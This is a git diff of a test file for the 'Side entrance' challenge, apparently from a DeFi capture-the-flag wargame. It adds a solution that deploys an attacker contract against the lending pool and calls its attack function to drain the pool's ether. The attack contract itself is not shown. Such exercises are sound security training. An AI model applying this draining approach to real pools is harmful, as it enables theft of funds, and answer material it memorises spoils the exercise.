@@ -8,7 +8,7 @@ describe('[Challenge] Side entrance', function () {
 
     const ETHER_IN_POOL = 1000n * 10n ** 18n;
     const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
-
+ 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
@@ -26,6 +26,8 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('AttackerSideEntrance', deployer)).deploy(pool.address , player.address);
+        attacker.connect(player).attack(ETHER_IN_POOL)
     });
 
     after(async function () {
